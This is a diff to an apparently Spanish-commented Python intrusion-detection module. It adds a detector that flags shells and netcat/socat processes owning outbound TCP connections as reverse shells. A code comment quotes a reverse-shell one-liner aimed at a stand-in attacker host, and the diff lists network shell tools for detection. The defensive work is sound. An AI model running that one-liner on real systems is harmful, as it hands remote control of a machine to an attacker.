@@ -169,7 +169,8 @@ def read_auditd_events() -> list[dict]:
 
 def collect_events() -> list[dict]:
     """Todos los eventos NUEVOS de sensores disponibles, normalizados."""
-    return read_falco_events() + read_auditd_events() + read_auth_log() + detect_port_scan()
+    return (read_falco_events() + read_auditd_events() + read_auth_log()
+            + detect_port_scan() + detect_reverse_shell())
 
 
 # ── auth.log / secure: fuerza bruta SSH + anti-forense (cierra GAP L2) ───────
@@ -317,4 +318,67 @@ def detect_port_scan(conns: list[dict] | None = None, now: float | None = None,
                 "target": {"ip": ip},
             })
     config.write_json(_window_path("scan"), win)
+    return events
+
+
+# ── reverse shell: intérprete con socket de red saliente (cierra GAP L6) ──────
+# Un shell o una navaja de red (nc/socat) que POSEE un socket TCP establecido hacia
+# un peer remoto es la firma del reverse shell (`bash -i >& /dev/tcp/atacante/4444`):
+# un shell de login legítimo habla con sshd por un pty, nunca por un socket TCP propio,
+# así que un bash/sh/nc con conexión de red es casi siempre C2. Los intérpretes de
+# propósito general (python, perl, php) quedan FUERA a propósito: son servidores
+# legítimos habituales y su reverse shell lo cazan los sensores de comportamiento
+# (Falco/eBPF) en F8 — aquí se prefiere no dar falsos positivos (límite honesto).
+SHELL_EXES = {"bash", "sh", "dash", "zsh", "ash", "busybox",
+              "nc", "ncat", "netcat", "socat"}
+
+
+def detect_reverse_shell(owners: list[dict] | None = None,
+                         listen_ports: set[int] | None = None) -> list[dict]:
+    """Shell/nc que posee una conexión TCP establecida SALIENTE = reverse shell.
+
+    Correlación conexión→proceso vía `recon.connection_owners` (inode de socket →
+    /proc/<pid>/exe). Nunca señala loopback ni las IPs propias del host. Solo cuentan
+    las conexiones SALIENTES (puerto local efímero, no de escucha): una conexión
+    ENTRANTE a un listener — aunque lo sirva nc — es un bind shell/servicio, no un
+    reverse shell (el puerto nuevo en escucha ya lo caza el sensor de puertos, L4).
+    Una alerta por canal C2 (exe · ip:puerto), con pid y exe para que la respuesta
+    pueda bloquear el canal y suspender solo el proceso dueño.
+    """
+    owners = recon.connection_owners() if owners is None else owners
+    own = recon.local_ips()
+    if listen_ports is None:
+        listen_ports = set()
+        for p in recon.collect_ports():
+            try:
+                listen_ports.add(int(str(p.get("local", "")).rsplit(":", 1)[-1]))
+            except (ValueError, IndexError):
+                continue
+    seen: set[tuple] = set()
+    events: list[dict] = []
+    for c in owners:
+        exe = c.get("exe")
+        ip = c.get("remote_ip", "")
+        if not exe or c.get("state") != "ESTABLISHED" or not ip or ip in own:
+            continue
+        if c.get("local_port") in listen_ports:
+            continue  # conexión ENTRANTE a un listener: no es un reverse shell saliente
+        if exe.rsplit("/", 1)[-1] not in SHELL_EXES:
+            continue
+        key = (exe, ip, c.get("remote_port"))
+        if key in seen:
+            continue
+        seen.add(key)
+        pid = c.get("pid")
+        events.append({
+            "sev": "crit", "kind": "reverse_shell",
+            "detail": f"shell con conexión saliente: {exe} → {ip}:{c.get('remote_port')}"
+                      f" (pid {pid})",
+            "why": "un shell que posee un socket de red saliente es la firma del C2 "
+                   "de un reverse shell: nadie legítimo lo hace",
+            "target": {"ip": ip, "port": c.get("remote_port"), "exe": exe,
+                       "pids": [pid] if isinstance(pid, int) else []},
+            # la huella no incluye el pid (cambia entre barridos); el canal C2 sí es estable
+            "fp_key": f"reverse_shell|{exe}|{ip}:{c.get('remote_port')}",
+        })
     return events
